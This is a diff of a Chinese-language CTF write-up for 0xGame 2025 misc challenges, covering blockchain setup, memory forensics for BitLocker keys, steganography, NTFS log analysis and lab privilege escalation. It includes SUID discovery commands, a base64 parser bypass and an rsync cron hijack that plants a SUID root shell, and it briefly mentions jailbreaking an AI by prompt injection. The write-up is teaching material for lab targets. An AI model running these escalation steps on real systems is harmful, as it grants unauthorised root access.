-<img src="/img/0xgame2025/20251013231157_022.webp" alt="image-20251008004720374" style="zoom:50%;" />
-
 这里随便填，没出现红色就没错
-
-<img src="/img/0xgame2025/20251013231157_023.webp" alt="image-20251008004823736" style="zoom:50%;" />
 
 关于这里的链 ID，你随便输入 1 个数字，会自动弹出正确的链 id，就长这样，改回去即可
 
-<img src="/img/0xgame2025/20251013231157_024.webp" alt="image-20251008004913872" style="zoom: 50%;" />
-
 最后保存了，才算 rpc 配置成功
 
-- 使用私钥添加用户
-
-<img src="/img/0xgame2025/20251013231157_025.webp" alt="image-20251008005042952" style="zoom:50%;" />
-
-<img src="/img/0xgame2025/20251013231157_026.webp" alt="image-20251008005104166" style="zoom:50%;" />
-
-<img src="/img/0xgame2025/20251013231157_027.webp" alt="image-20251008005131514" style="zoom:50%;" />
+* 使用私钥添加用户
 
 将 private key 复制进去，导入即可，可以看到，已经有初始余额 1ctf 了
 
-<img src="/img/0xgame2025/20251013231158_028.webp" alt="image-20251008005238744" style="zoom:50%;" />
-
-- 部署合约
+* 部署合约
 
 接下来需要使用在线 ide - [remix](https://remix.ethereum.org/)
 
@@ -1388,19 +1326,12 @@ metamask 在哪个浏览器，就在哪个浏览器上访问
 
 新建个 sol 文件，将题目下发的 Setup.sol 复制进去，文件名也要一样的喔，这里设计合约里面的合约名，总之就是要一样
 
-<img src="/img/0xgame2025/20251013231158_029.webp" alt="image-20251008005856453" style="zoom:50%;" />
-
 然后进行编译，部署
-
-<img src="/img/0xgame2025/20251013231158_030.webp" alt="image-20251008005943306" style="zoom:50%;" />
-
-<img src="/img/0xgame2025/20251013231158_031.webp" alt="image-20251008010105311" style="zoom: 50%;" />
 
 这里进行部署，需要先设置环境，选中浏览器插件-->Injected Provider-MetaMask 会自动关联当前钱包用户以及对应网络，然后再将合约地址复制过来，粘贴到 At Address 中，点击即可（要大致理解，我们的挑战合约应该部署到题目下发的那个地址，不然我们要是成功了，题目怎么判定呢？
 
-
-
 {% raw %}
+
 ```liquid
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.0;
@@ -1427,33 +1358,20 @@ contract Setup {
     receive() external payable {}
 }
 ```
+
 {% endraw %}
 
-
-
-
-- 审计合约完成挑战
+* 审计合约完成挑战
 
 读完挑战合约，就考察了一点，就是选手需要提交一个字符串`welcome_to_0xGame2025`，只有这样，才能让 solved 返回 true，才算完成了挑战（真的是简单上链吧，算是 0xgame2025week2 的一个签到题
 
-<img src="/img/0xgame2025/20251013231158_032.webp" alt="image-20251008011336047" style="zoom:50%;" />
-
-<img src="/img/0xgame2025/20251013231158_033.webp" alt="image-20251008011354650" style="zoom:50%;" />
-
 > 这是区块链上最最基础的知识（没有涉及任何区块链安全，区块链还是很有意思的，在国外赛事或国内大型赛事中会经常看到 blockchain，这个赛道相对来说，确实很新很难，如果大家后面打算专攻 misc，可以对区块链研究一二，相信会有人体会到区块链的魅力的
-
-<div align="left">
-<img src="/img/0xgame2025/20251013231159_034.webp" alt="完结撒花" style="width:30%;">
-</div>
-
 
 ## Week3
 
 ### 神秘图书管理员
 
 > ai 提示词注入，方法五花八门的，我这里给出我测试成功的一个案例（不保证能复现成功……
-
-<img src="/img/0xgame2025/image-20251014132148690.png" alt="image-20251014132148690" style="zoom:50%;" />
 
 > 这是 ai 题目中相对而言最简单的一个考法，通过创造某个情景，让 ai 越狱，跳出出题人设置的 prompt，然后大家后面想深入学习 ai 的话，建议开始上手机器学习等等，真正的难题在我看来应该是样本对抗，数据投毒，等等
 
@@ -1463,19 +1381,11 @@ contract Setup {
 
 运行游戏以及`Cheat Engine`，点击左上角 file 下面的像电脑的图标，在弹出的`process list`中选中运行的游戏，双击就能将进程 attach 进去
 
-<img src="/img/0xgame2025/image-20251014135650113.png" alt="image-20251014135650113" style="zoom:50%;" />
-
 随便点击几个阳光，让 Sunshine 的值变化一下（主要是越特殊，我们越好找，一个 exe 运行的时候，内部有好多好多值，指不定会抓取到其他的变量
-
-<img src="/img/0xgame2025/image-20251014140044121.png" alt="image-20251014140044121" style="zoom:50%;" />
 
 将目前的值 5690 给输入到 value 中，然后点击`first scan`，会发现左侧弹出了一个地址，这就表示 cheat engine 已经找到游戏运行的内存中，存储阳光数量的内存，双击会让结果出现在最下面，再次双击数字 5690，弹出窗口，我们就可以编辑该内存的数值了
 
-<img src="/img/0xgame2025/image-20251014140347563.png" alt="image-20251014140347563" style="zoom:50%;" />
-
 点击 ok 后，会发现游戏收集阳光数量已经达到了 666666，再随意点击一个阳光就能弹出 flag
-
-<img src="/img/0xgame2025/image-20251014140453663.png" alt="image-20251014140453663" style="zoom:50%;" />
 
 这里还有其他方法或工具，比如说我们可以直接将 666666 改成 1 就好了
 
@@ -1496,8 +1406,6 @@ contract Setup {
 ![image-20251014171458687](/img/0xgame2025/image-20251014171458687.png)
 
 就像上面截图，可以观察到 shell 的 base64 解密工具会灵活将所有编码进行解码，也就是说它认定要解码的内容一直到最后一个字符，然后关注 python 的 base64 库，会发现它遇到=号填充的时候停止继续读取
-
-<img src="/img/0xgame2025/image-20251014213400430.png" alt="image-20251014213400430" style="zoom:50%;" />
 
 关注这部分核心函数，会发现容器先是进行 python 的 base64 库的解码，会对解码的值进行正则匹配，只能出现字母，数字，下划线，而这也就意味着我们不能输入带参数的命令（空格就绕不开
 
@@ -1611,8 +1519,6 @@ if __name__ == '__main__':
     main()
 ```
 
-
-
 > 关于 python 解释器的差异，经常用应该就会发现（之前不知道的，这次知道就好了，其实我也是现学的
 
 #### 提权
@@ -1625,16 +1531,25 @@ find / -perm -u=s -type f 2>/dev/null
 
 命令详解：
 
-- find /
-- - 文件搜索命令，从根目录开始查找
-- -perm -u=s
-- - -perm 是按照权限模式查找
-  - -u=s：u 表示用户，s 表示“SetUID"位，-前缀表示”包含这些权限位“，不要求完全匹配
-  - suid 提权是说当普通用户执行具有 suid 位程序时，程序会以文件所有者的权限运行（一般来说，系统只有 root 用户才能设置 SUID 位程序
-- -type f
-- - 只查找普通文件（不包括目录、设备文件等）
-- 2>/dev/null
-- - 错误处理，只需要记住这样做会让 Linux 输出没有任何报错信息，可以让输出更清晰
+* find /
+
+* * 文件搜索命令，从根目录开始查找
+
+* -perm -u=s
+
+* * -perm 是按照权限模式查找
+
+  * -u=s：u 表示用户，s 表示“SetUID"位，-前缀表示”包含这些权限位“，不要求完全匹配
+
+  * suid 提权是说当普通用户执行具有 suid 位程序时，程序会以文件所有者的权限运行（一般来说，系统只有 root 用户才能设置 SUID 位程序
+
+* -type f
+
+* * 只查找普通文件（不包括目录、设备文件等）
+
+* 2>/dev/null
+
+* * 错误处理，只需要记住这样做会让 Linux 输出没有任何报错信息，可以让输出更清晰
 
 与上面类似的查找 suid 权限的命令有
 
@@ -1687,11 +1602,9 @@ shell> dd if=/flag
 --- 命令执行中... ---
 0xGame{BasE64_Dec0der_w1th_DD}
 shell> 
-
 ```
 
-> 关于 suid 提权常见的命令，这里有个汇总网站，请大家自行探索https://gtfobins.github.io/gtfobins/
->
+> 关于 suid 提权常见的命令，这里有个汇总网站，请大家自行探索<https://gtfobins.github.io/gtfobins/>\
 > 建议见过一次就掌握一次，我们后面学习渗透时候，提权经常会用到
 
 ### Bitlocker 安全吗？
@@ -1704,17 +1617,22 @@ shell>
 
 BitLocker 加密通常涉及至少三个主要的密钥层级：
 
-- **全卷加密密钥 (Full Volume Encryption Key, FVEK):** 这是直接用于加密和解密磁盘上数据的密钥。
-- **卷主密钥 (Volume Master Key, VMK):** FVEK 是由 VMK 加密的。加密后的 FVEK 存储在 BitLocker 磁盘的元数据中。
-- **保护器 (Protectors):** VMK 是由一个或多个“保护器”加密的。保护器可以是用户的密码、TPM（可信平台模块）、恢复密钥 (Recovery Key) 或启动 PIN 等。加密后的 VMK 也存储在磁盘元数据中。
+* **全卷加密密钥 (Full Volume Encryption Key, FVEK):** 这是直接用于加密和解密磁盘上数据的密钥。
+
+* **卷主密钥 (Volume Master Key, VMK):** FVEK 是由 VMK 加密的。加密后的 FVEK 存储在 BitLocker 磁盘的元数据中。
+
+* **保护器 (Protectors):** VMK 是由一个或多个“保护器”加密的。保护器可以是用户的密码、TPM（可信平台模块）、恢复密钥 (Recovery Key) 或启动 PIN 等。加密后的 VMK 也存储在磁盘元数据中。
 
 #### 密钥解密加载过程
 
 当 BitLocker 保护的磁盘需要被访问（即解锁）时，系统会进行以下步骤：
 
 1. 用户提供密码、PIN 或 TPM 验证通过（使用某个保护器）。
+
 2. 保护器用于解密存储在磁盘元数据中的 **VMK**，得到**明文 VMK**。
+
 3. **明文 VMK** 用于解密存储在磁盘元数据中的 **FVEK**，得到**明文 FVEK**。
+
 4. **明文 FVEK**（或用于数据加解密的更低级别的子密钥）会被加载到计算机的**内存（RAM）**中，供磁盘驱动程序实时进行数据的加密和解密操作。
 
 > 这里就要关注了，一旦获取了内存镜像，是有办法恢复 FVEK 的
@@ -1727,8 +1645,6 @@ BitLocker 加密通常涉及至少三个主要的密钥层级：
 https://github.com/lorelyai/volatility3-bitlocker
 https://github.com/breppo/Volatility-BitLocker
 ```
-
-
 
 #### how to solve(以 vol2 为例)
 
@@ -1755,17 +1671,16 @@ INFO    : volatility.debug    : Determining profile based on KDBG search...
 
 接下来的命令中，我们需要添加参数`--profile=<profile>`去运行其他 vol 插件
 
-> 大家可以理解 profile 是一个系统的字典
->
-> 本质上，它是特定操作系统内核的数据结构定义和符号表信息的集合
->
-> 核心作用：
->
-> - 定位关键数据
-> - 正确解析数据
-> - 匹配操作系统
->
-> 进行取证分析的时候，必须指定合适的 profile，不同操作系统的配置差异很大
+> 大家可以理解 profile 是一个系统的字典\
+> 本质上，它是特定操作系统内核的数据结构定义和符号表信息的集合\
+> 核心作用：\
+> 进行取证分析的时候，必须指定合适的 profile，不同操作系统的配置差异很大\
+> \
+> \
+> \
+> 定位关键数据\
+> 正确解析数据\
+> 匹配操作系统
 
 ```bash
 ~$ mkdir -p ~/Desktop/timu/dislockerkeys
@@ -1845,11 +1760,15 @@ Device                                    Boot Start    End Sectors Size Id Type
 
 这里一次性创建两个挂载文件夹
 
-- 第一个是`dislocker`的输出卷
-- - `dislocker`会在这个目录下创建一个名为`dislocker-file`的特殊文件（或者叫它设备）
-  - 这个`dislocker-file`是一个虚拟的 NTFS 卷。它的作用是：`dislocker`在后台实时地对加密数据进行解密，并将解密后的数据流以 NTFS 文件系统形式呈现给操作系统
-- 第二个是`NTFS`挂载卷
-- - 由于`dislocker-file`本质上是一个标准的 NTFS 文件系统卷，需要使用标准的 mount 命令（通常是`mount -o loop`或`mount -o ro`）将其作为文件系统挂载到第二个目标文件夹中，完成这一步后，我们就可以正常的在第二个文件夹中访问加密磁盘内部的文件内容
+* 第一个是`dislocker`的输出卷
+
+* * `dislocker`会在这个目录下创建一个名为`dislocker-file`的特殊文件（或者叫它设备）
+
+  * 这个`dislocker-file`是一个虚拟的 NTFS 卷。它的作用是：`dislocker`在后台实时地对加密数据进行解密，并将解密后的数据流以 NTFS 文件系统形式呈现给操作系统
+
+* 第二个是`NTFS`挂载卷
+
+* * 由于`dislocker-file`本质上是一个标准的 NTFS 文件系统卷，需要使用标准的 mount 命令（通常是`mount -o loop`或`mount -o ro`）将其作为文件系统挂载到第二个目标文件夹中，完成这一步后，我们就可以正常的在第二个文件夹中访问加密磁盘内部的文件内容
 
 > 小汇总：可以理解成第一个文件夹是加密 dd 镜像解密时候用的，里面的内容是给系统看的，我们不能直接读，但是它给了一个输出，我们把这个输出导入到另一个文件夹中，这会儿我们就能正常读取了
 
@@ -1870,10 +1789,13 @@ ecrypted
 
 这是很常见的磁盘挂载命令了
 
-- mount 是系统的挂载命令
-- -o loop 是指定我们后面挂载的源是一个文件，而不是一个物理块设备，系统会自动创建一个虚拟块设备，将这个文件视为一个磁盘分区
-- -o ro 这个是只读选项，我们只能读取加密卷，不做编辑，所以这个还是蛮有必要的，后面我们进行取证的时候，如果不慎将文件编辑（也许正好是我们重要的文件呢？），还没有备份，这个题就寄了
-- -t ntfs-3g 这是因为我们上面使用 fdisk 查看镜像的时候，读取到的
+* mount 是系统的挂载命令
+
+* -o loop 是指定我们后面挂载的源是一个文件，而不是一个物理块设备，系统会自动创建一个虚拟块设备，将这个文件视为一个磁盘分区
+
+* -o ro 这个是只读选项，我们只能读取加密卷，不做编辑，所以这个还是蛮有必要的，后面我们进行取证的时候，如果不慎将文件编辑（也许正好是我们重要的文件呢？），还没有备份，这个题就寄了
+
+* -t ntfs-3g 这是因为我们上面使用 fdisk 查看镜像的时候，读取到的
 
 ```text
 Device                                    Boot Start    End Sectors Size Id Type
@@ -1899,8 +1821,6 @@ Device                                    Boot Start    End Sectors Size Id Type
 
 挂载好后，读取 flag 即可
 
-
-
 ##### vol3 命令展示
 
 > 里面部分文件路径我给简化了，大概看看过程就好了
@@ -1925,12 +1845,6 @@ yolo@yolo:~$ sudo rmdir /mnt/decrypted
 
 > 这真的是一把梭，所以还是希望学弟学妹掌握了上面用 vol 手动提取后，再使用这个（至少通过内存解密 BitLocker 的原理得说得上一二吧
 
-<img src="/img/0xgame2025/image-20251012232754704.png" alt="image-20251012232754704" style="zoom:50%;" />
-
-
-
-
-
 ### A cute dog
 
 本题确实是个难题（但是考点并不难
@@ -1941,29 +1855,33 @@ yolo@yolo:~$ sudo rmdir /mnt/decrypted
 
 #### Apng 格式简单梳理
 
-https://lastnigtic.cn/posts/apng-editor/
+<https://lastnigtic.cn/posts/apng-editor/>
 
 上面链接介绍的很清晰很清晰，下面就针对题目可能用到的知识简单说说
 
 把它当作 png 图片处理没有太大的问题，它新增了几个数据块，关注下 fcTL 块，可以控制帧间混合效果，是直接覆盖还是部分覆盖，偏移量和延时等信息
 
-- sequence_number 帧序号
-- width 宽度
-- height 高度
-- x_offset 此帧数据 x 轴偏移量
-- y_offset 此帧数据 y 轴偏移量
-- delay_num 间隔分子
-- delay_den 间隔分母
-- dispose_op 在显示该帧之前，需要对前面缓冲输出区域做何种处理。
-- blend_op 帧渲染类型
+* sequence_number 帧序号
+
+* width 宽度
+
+* height 高度
+
+* x_offset 此帧数据 x 轴偏移量
+
+* y_offset 此帧数据 y 轴偏移量
+
+* delay_num 间隔分子
+
+* delay_den 间隔分母
+
+* dispose_op 在显示该帧之前，需要对前面缓冲输出区域做何种处理。
+
+* blend_op 帧渲染类型
 
 然后本题第一步考点是时间轴隐写
 
-<img src="/img/0xgame2025/image-20251015202310826.png" alt="image-20251015202310826" style="zoom:50%;" />
-
 很清楚吧，这里的 delay_num 就是动画延时时间，我们直接用脚本提取，脚本逻辑很好懂吧，只要熟悉 png 的数据结构就能处理了呢，不熟悉数据块组成的，来这里看（4+4+len(长度)+4），懂我意思不？
-
-<img src="/img/0xgame2025/image-20251015205305380.png" alt="image-20251015205305380" style="zoom:50%;" />
 
 ```python
 import struct
@@ -2024,7 +1942,6 @@ extracted delay num
 ascii decoded:the_24th_maybe_useful
 
 """
-
 ```
 
 可以读出，隐写信息是第 24 个图片有点东西，那就想办法恢复出来，python 有个 apng 库，还是挺厉害的
@@ -2063,21 +1980,13 @@ if __name__ =="__main__":
 
 恢复出来后，直接分析 frame_023.png（懵逼了吧，为啥我不分析 024？因为整个 apng 逐帧提取出来的 png 是从 0 开始的
 
-<img src="/img/0xgame2025/image-20251015214136483.png" alt="image-20251015214136483" style="zoom:50%;" />
-
 单纯考察了 LSB 隐写，发现这里隐写了一个压缩包，但是会发现压缩包完全是倒着隐写进去的，需要我们处理下，细节大家自己观察，我这里给出解决方案：直接点击 save bin，将整个 lsb 隐写的二进制信息提取出来，补充，那个 save text 是将预览右侧的可读字符给保存出来了
 
-<img src="/img/0xgame2025/image-20251015214623565.png" alt="image-20251015214623565" style="zoom:50%;" />
-
 注意这里，箭头标注的地方才是压缩包头
-
-<img src="/img/0xgame2025/image-20251015214906015.png" alt="image-20251015214906015" style="zoom:50%;" />
 
 我这里形容下，我要隐藏 123，就按照 321 的顺序隐藏进去的，然后呢，50 这样的是一个字节，不能变成 05，选中后`ctrl+shift+c`复制，然后新建一个文件，`ctrl+shift+v`粘贴
 
 接下来就是用一个很简单很简单的 python 进行倒序输出文件即可
-
-<img src="/img/0xgame2025/image-20251015220059700.png" alt="image-20251015220059700" style="zoom:50%;" />
 
 拿到了第一部分 flag
 
@@ -2094,15 +2003,9 @@ the gifts are these:
 
 > 确实，这里算是本题的一个败笔，我的初衷是想设计一个不用任何工具的 misc 题目，但是这是我之前出的题了，现改不能保证出好（不过不要喷我啊，这种有隐写工具的题目才算是那种很常见的 misc 题呢
 
-<img src="/img/0xgame2025/image-20251015220444898.png" alt="image-20251015220444898" style="zoom:50%;" />
-
 将 part2.zip 解压后，拿到的图片用 010 看，会发现 crc 报错，这里就考察了 crc 宽高爆破，关于爆破原理，请去参考我的[博客](https://yo1o.top/2025/04/13/png-challenge/)
 
-<img src="/img/0xgame2025/image-20251015220712663.png" alt="image-20251015220712663" style="zoom:50%;" />
-
 然后宽高修改，我也在 week2 上讲过，需要修改 IHDR 块的部分内容，高度改 800 就能拿到第二部分 flag
-
-<img src="/img/0xgame2025/image-20251015221030965.png" alt="image-20251015221030965" style="zoom:50%;" />
 
 ## Week4
 
@@ -2118,12 +2021,17 @@ the gifts are these:
 
 记录的元数据操作：
 
-- ✅ **文件创建/删除**
-- ✅ **文件重命名**
-- ✅ **权限变更**
-- ✅ **文件大小变化**
-- ✅ **目录结构修改**
-- ❌ **文件实际内容**（不记录）
+* ✅ **文件创建/删除**
+
+* ✅ **文件重命名**
+
+* ✅ **权限变更**
+
+* ✅ **文件大小变化**
+
+* ✅ **目录结构修改**
+
+* ❌ **文件实际内容**（不记录）
 
 可以理解我为啥说它很重要了吧，在实战中，要是想检测 hacker 在哪里写了🐎，通过这个 logfile 还是有可能找到的，而且它几乎无法被篡改（篡改难度很大，只有 SYSTEM 权限（最高权限）才能写，要绕过文件系统驱动，还要满足处理事务一致性检查
 
@@ -2133,25 +2041,17 @@ the gifts are these:
 
 第一个是使用 autopsy
 
-<img src="/img/0xgame2025/image-20251016130518222.png" alt="image-20251016130518222" style="zoom:50%;" />
-
 挂载好后，直接提取即可
 
 第二个方法是用 7z 直接打开 vhd
-
-<img src="/img/0xgame2025/image-20251016130625300.png" alt="image-20251016130625300" style="zoom:50%;" />
 
 注意，一定要找到正确的路径
 
 提取出来后，会发现它是二进制文件，我们需要找到合适的平台或工具挂载
 
-推荐这个项目https://github.com/jschicht/LogFileParser
-
-<img src="/img/0xgame2025/image-20251016132706035.png" alt="image-20251016132706035" style="zoom:50%;" />
+推荐这个项目<https://github.com/jschicht/LogFileParser>
 
 运行完后，会在工具路径下得到一堆 csv 文件以及完整的日志数据库文件
-
-<img src="/img/0xgame2025/image-20251016132852517.png" alt="image-20251016132852517" style="zoom:50%;" />
 
 这是那个记录 FileNames 的 csv，其实已经可以看到部分关键信息了，但是对此还有怀疑，因为工具并没有帮助我们输出前后文件名变化，接下来直接分析那个 db 数据库，里面记录的东西更多，而且更好分析日志
 
@@ -2176,7 +2076,7 @@ db 是一种数据库文件，一般来说，我们用 sqlite3 工具打开进�
 
 ##### 就 LogFile 表字段分类进行解析
 
-- 基础标识字段
+* 基础标识字段
 
 ```text
 lf_Offset TEXT,                    -- 记录在$LogFile中的物理偏移地址
@@ -2186,9 +2086,7 @@ lf_MftHdr_Lsn INTEGER,             -- MFT头中的LSN
 lf_MftHdr_Flags TEXT,              -- MFT记录标志（IN_USE等）
 ```
 
-
-
-- 事务和操作跟踪
+* 事务和操作跟踪
 
 ```text
 lf_LSN INTEGER,                    -- 日志序列号（操作顺序）
@@ -2200,9 +2098,7 @@ lf_record_type INTEGER,            -- 记录类型
 lf_transaction_id INTEGER,         -- 事务ID
 ```
 
-
-
-- 文件名相关
+* 文件名相关
 
 ```text
 lf_FileName TEXT,                  -- 文件名！！！（这是你要找的）
@@ -2217,9 +2113,7 @@ lf_UsnJrlReason TEXT,             -- USN变更原因（如创建、删除、重�
 lf_UsnJrnlUsn INTEGER,            -- USN序列号
 ```
 
-
-
-- 时间戳信息
+* 时间戳信息
 
 ```text
 lf_SI_CTime TEXT,                  -- 标准信息创建时间
@@ -2232,9 +2126,7 @@ lf_FN_MTime TEXT,                  -- 文件名信息修改时间
 lf_FN_RTime TEXT,                  -- 文件名信息MFT记录时间
 ```
 
-
-
-- 文件属性和数据
+* 文件属性和数据
 
 ```text
 lf_FN_AllocSize INTEGER,           -- 分配大小
@@ -2245,7 +2137,7 @@ lf_DT_DataRuns TEXT,               -- 数据运行列表（文件内容位置）
 lf_DT_RealSize INTEGER,            -- 数据属性实际大小
 ```
 
-- 数据属性相关字段
+* 数据属性相关字段
 
 ```text
 lf_DT_StartVCN INTEGER,           -- 数据属性起始虚拟簇号
@@ -2258,7 +2150,7 @@ lf_DT_DataRuns TEXT,              -- 数据运行列表（文件物理位置）
 lf_DT_Name TEXT,                  -- 数据属性名称
 ```
 
-- 事务和恢复相关
+* 事务和恢复相关
 
 ```text
 lf_RealMFTReference INTEGER,      -- 实际的MFT引用号
@@ -2270,9 +2162,7 @@ lf_RedoChunkSize INTEGER,         -- 重做操作数据块大小
 lf_UndoChunkSize INTEGER,         -- 撤销操作数据块大小
 ```
 
-
-
-- 标志和状态字段
+* 标志和状态字段
 
 ```text
 lf_flags INTEGER,                 -- 记录标志位
@@ -2293,13 +2183,15 @@ IncompleteTransaction INTEGER     -- 是否是不完整事务
 lf_UsnJrlTimestamp, lf_UsnJrlReason, lf_FileName,lf_UsnJrlReason,lf_LSN
 ```
 
-- lf_LSN 日志序列号，是日志记录中，文件操作的绝对时间顺序，值越大显得文件越新
-- lf_FileName 日志记录的文件名，重命名前后的文件名都有，它实时更新的，所以说之前的文件名和之后的文件名都会被记录的
-- lf_UsnJrlFileNameUSN 日志中的文件名，这个 USN 是单独的一个记录文件操作的小日志板块
-- lf_UsnJrlTimestampUSN 日志时间戳，记录文件操作时候的时间信息
-- lf_UsnJrlReasonUSN 变更原因，这会记录文件操作的事件，比如说文件创建，删除，重命名，文件关闭，数据扩展等等
+* lf_LSN 日志序列号，是日志记录中，文件操作的绝对时间顺序，值越大显得文件越新
 
-<img src="/img/0xgame2025/image-20251016135205570.png" alt="image-20251016135205570" style="zoom:50%;" />
+* lf_FileName 日志记录的文件名，重命名前后的文件名都有，它实时更新的，所以说之前的文件名和之后的文件名都会被记录的
+
+* lf_UsnJrlFileNameUSN 日志中的文件名，这个 USN 是单独的一个记录文件操作的小日志板块
+
+* lf_UsnJrlTimestampUSN 日志时间戳，记录文件操作时候的时间信息
+
+* lf_UsnJrlReasonUSN 变更原因，这会记录文件操作的事件，比如说文件创建，删除，重命名，文件关闭，数据扩展等等
 
 ```sql
 SELECT lf_UsnJrlTimestamp, lf_UsnJrlReason, lf_FileName FROM LogFile WHERE lf_UsnJrlReason LIKE '%RENAME%' ORDER BY lf_LSN;
@@ -2347,11 +2239,8 @@ print(f"{flag}")
 
 ### ezHack
 
-> Yolo 好久之前打的一个渗透，提权的时候遇到的，感觉不错，就写了个 docker 给大家玩
->
+> Yolo 好久之前打的一个渗透，提权的时候遇到的，感觉不错，就写了个 docker 给大家玩\
 > 因为提权方式很多很杂，所以这个授课我选择边打边讲，然后提权手段也是直接说清楚怎么提权，中间的尝试部分就不为大家赘叙了
-
-<img src="/img/0xgame2025/image-20251016201003697.png" alt="image-20251016201003697" style="zoom:50%;" />
 
 ssh 靶机连接我不详述了，忘记了回去看 week1
 
@@ -2395,8 +2284,6 @@ ctf@dep-1f31e3dc-af66-4648-afb6-1b7bad80dc22-69cd6d55bf-trqhl:~$ cat /etc/cron.d
 
 这里我给出的提权方式是命令劫持，先使用 rsync --help 分析所有功能
 
-<img src="/img/0xgame2025/image-20251016203959362.png" alt="image-20251016203959362" style="zoom:50%;" />
-
 关注这里，意思是说 rsync 允许我们指定一个程序进行远程连接主机，这里的 COMMAND 可以是 bash 命令，也可以是一个脚本文件，研究了这么久的 Linux，大家应该有所体会，创建一个文件名是不可能出现'/'这样的特殊符号的,但是我们完全可以指定 shell 脚本文件（虽说 rsync 本意是为了让我们用脚本辅助远程连接，但是不管有没有远程连接成功，这个脚本都会被 root 执行，这也就给我们提权机会了
 
 ```bash
@@ -2407,14 +2294,10 @@ echo -e '#!/bin/bash\ncp /bin/bash /home/ctf/rootbash\nchmod u+s /home/ctf/rootb
 
 我这里使用 echo 命令，然后写了个可以复制/etc/bash 的命令，再加了个 suid 权限，这么多内容，显然不能直接写入，我指定了-e，可以执行一些特定命令，比如\n 换行等等
 
-<img src="/img/0xgame2025/image-20251016211023397.png" alt="image-20251016211023397" style="zoom:50%;" />
-
 最后效果如上
 
-> **拓展**
->
-> 温馨提示，#!/bin/bash 这一行可以省略，但是还是建议保留
->
+> **拓展**\
+> 温馨提示，#!/bin/bash 这一行可以省略，但是还是建议保留\
 > 这个被叫做`Shebang` ，如果我们不指定 sh 也可以执行，直接./shell.sh 就好了，但是！！！一定要提前`chmod +x shell.sh`，给它加个执行权限，这里大家了解学习
 
 然后这里不一定要写我这样的命令，有简单的，直接 ls /root/确定 flag.txt，然后 cat /root/flag.txt；也有难的，直接将当前用户拉进 root 权限组，或者说编辑/etc/sudoers 文件，让当前用户可以无密码执行 sudo 等等
@@ -2468,31 +2351,29 @@ rootbash-5.2# cat /root/flag.txt
 
 ###### 为什么 `uid` 还是 `ctf`？
 
+* **UID (User ID)**：**实际用户 ID**。这就像我们的**真实身份证**。无论我们做什么，发起这个操作的真实身份始终是 `ctf` (`uid=1000`)。
 
-
-- **UID (User ID)**：**实际用户 ID**。这就像我们的**真实身份证**。无论我们做什么，发起这个操作的真实身份始终是 `ctf` (`uid=1000`)。
-- **结论：** 我们的登录身份没有改变，仍然是从 `ctf` 用户的会话中发起的操作。
-
-
+* **结论：** 我们的登录身份没有改变，仍然是从 `ctf` 用户的会话中发起的操作。
 
 ###### 2. 什么是 `euid`？—— 权限的临时“工牌”
 
+* **EUID (Effective User ID)**：**有效用户 ID**。这才是系统进行**权限检查**时所依据的身份。可以把 EUID 理解为我们的**临时“工牌”或“通行证”**。
 
+* **SUID 机制的工作原理：**
 
-- **EUID (Effective User ID)**：**有效用户 ID**。这才是系统进行**权限检查**时所依据的身份。可以把 EUID 理解为我们的**临时“工牌”或“通行证”**。
-- **SUID 机制的工作原理：**
-  - 当一个带有 SUID 权限（所有者是 `root`）的程序被执行时，Linux 内核会把执行者的 **EUID** **临时修改**成该文件的**所有者**的 UID。
-  - 在我们的例子中，`./rootbash` 的所有者是 `root (0)`，所以当 `ctf` 用户运行它时，**EUID 临时变成了 `0(root)`**。
-- **结论：** 你虽然还是 `ctf` 本人（UID），但你现在佩戴了一张 “Root 权限” 的工牌（EUID），系统允许你执行 Root 才能进行的操作（如 `cat /root/flag.txt`）。
+  * 当一个带有 SUID 权限（所有者是 `root`）的程序被执行时，Linux 内核会把执行者的 **EUID** **临时修改**成该文件的**所有者**的 UID。
 
+  * 在我们的例子中，`./rootbash` 的所有者是 `root (0)`，所以当 `ctf` 用户运行它时，**EUID 临时变成了&#x20;**`0(root)`。
 
+* **结论：** 你虽然还是 `ctf` 本人（UID），但你现在佩戴了一张 “Root 权限” 的工牌（EUID），系统允许你执行 Root 才能进行的操作（如 `cat /root/flag.txt`）。
 
 ###### 3. `whoami` 为什么显示 `root`？
 
 执行**`./rootbash -p` 本质上调用了一个新的 Shell**。
 
-- 当你在 SUID Shell 中运行 `whoami` 命令时，它并不是回复你的登录用户名，而是去查询**当前执行它的这个进程的 EUID** 对应的用户名。
-- 因为这个 SUID Shell 的 EUID 是 `root`，所以它理所当然地回答：“我是 `root`”
+* 当你在 SUID Shell 中运行 `whoami` 命令时，它并不是回复你的登录用户名，而是去查询**当前执行它的这个进程的 EUID** 对应的用户名。
+
+* 因为这个 SUID Shell 的 EUID 是 `root`，所以它理所当然地回答：“我是 `root`”
 
 > 渗透真的很重视实战，学长建议对这方面感兴趣的学弟学妹要多在靶机网站打，积累足够多的经验，这对后面打护网、安全研究、安全稳固等等实操中帮助很大很大
 
@@ -2504,25 +2385,29 @@ rootbash-5.2# cat /root/flag.txt
 
 **CRC32 是什么？**
 
-- **全称**：Cyclic Redundancy Check，循环冗余校验。
-- **用途**：它是一种**数据完整性校验**算法，而不是加密算法。它的主要目的是检查数据在传输或存储过程中是否发生了意外的损坏或改变。
-- **原理**：它会根据文件的二进制内容，通过一套固定的数学运算，生成一个 32 位的整数值（即 CRC32 校验码）。你可以把它想象成是文件的一个非常简单的“指纹”。如果文件的任何一个比特（bit）发生了改变，那么重新计算出的 CRC32 值有极大的概率会不同。
-- **关键特性**：计算速度非常快。
+* **全称**：Cyclic Redundancy Check，循环冗余校验。
+
+* **用途**：它是一种**数据完整性校验**算法，而不是加密算法。它的主要目的是检查数据在传输或存储过程中是否发生了意外的损坏或改变。
+
+* **原理**：它会根据文件的二进制内容，通过一套固定的数学运算，生成一个 32 位的整数值（即 CRC32 校验码）。你可以把它想象成是文件的一个非常简单的“指纹”。如果文件的任何一个比特（bit）发生了改变，那么重新计算出的 CRC32 值有极大的概率会不同。
+
+* **关键特性**：计算速度非常快。
 
 **ZIP 压缩包的结构**
 
-- 一个 ZIP 包里可以包含多个文件。对于每个文件，ZIP 格式都会存储两部分信息：
-  - **文件数据（File Data）**：这是文件本身的内容，经过压缩和加密。
-  - **文件元数据（Metadata/Header）**：这是描述文件信息的数据，比如文件名、原始大小、压缩后的大小，以及最重要的——**原始文件（未加密前）的 CRC32 校验码**。
-- **致命缺陷**：在使用传统的 ZipCrypto 加密时，**文件数据本身是被加密的，但包含 CRC32 值的这部分元数据却是以明文形式存储的，没有被加密**。
+* 一个 ZIP 包里可以包含多个文件。对于每个文件，ZIP 格式都会存储两部分信息：
 
----
